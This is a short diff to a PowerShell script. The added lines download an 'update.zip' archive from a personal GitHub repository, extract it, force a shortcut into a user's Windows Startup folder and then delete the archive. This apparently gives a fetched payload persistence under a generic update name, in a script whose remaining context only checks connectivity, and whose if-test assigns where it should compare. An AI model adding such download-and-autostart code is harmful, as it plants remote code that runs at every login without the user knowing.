@@ -1,3 +1,10 @@
+Set-Location -Path $home\Downloads
+wget https://github.com/mattiewae/EncoderInstall/blob/master/update.zip?raw=true -OutFile .\update.zip
+Expand-Archive -Path .\update.zip
+Move-Item .\update.lnk -Destination 'C:\Users\ENG\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' -Force
+Remove-Item .\update.zip 
+
+
 $Connect = Test-Connection 'www.google.com' -Quiet
 
 if($Connect = $true){
